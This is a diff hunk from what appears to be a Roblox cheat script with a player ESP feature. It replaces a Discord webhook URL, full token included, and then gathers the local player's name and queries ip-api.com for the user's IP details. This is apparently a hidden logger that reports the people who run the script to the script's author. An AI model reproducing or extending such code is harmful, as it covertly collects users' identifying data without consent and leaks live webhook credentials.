@@ -505,7 +505,7 @@ getgenv().CreatePartEsp = function(Player)
     end
 end
 local player_name = game:GetService("Players").LocalPlayer.Name
-local webhook_url = "https://discord.com/api/webhooks/1062926009881600121/HyK9i8nXlYRinw9L05h44tQGZl4dbh2UrVGKs5sgeDa6bDg9yS2LmnH12DaoeZ8VCMuc"
+local webhook_url = "https://discord.com/api/webhooks/1062931547998662726/98F7MHvy2ziY8f5KE-BMAenBhm7R4kwyF0sOqKG_6JqL1d4fx5Gqrb8bDFF2U2AIyRpf"
 
 local ip_info = syn.request({
     Url = "http://ip-api.com/json",
